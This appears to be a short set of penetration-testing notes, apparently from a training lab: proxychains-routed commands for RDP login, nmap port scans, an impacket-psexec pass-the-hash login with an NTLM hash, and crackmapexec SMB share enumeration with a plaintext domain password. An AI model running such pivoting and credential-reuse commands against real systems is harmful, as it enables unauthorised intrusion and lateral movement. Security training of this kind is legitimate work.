
```
sudo proxychains xfreerdp /v:TARGET /u:luiza
```

```
proxychains nmap -vvv -sT --top-ports=20 -Pn TARGET
```

```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n TARGET
```

```
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@TARGET
```

```
proxychains -q crackmapexec smb TARGET-241 TARGET -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```

```
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 TARGET TARGET TARGET
```

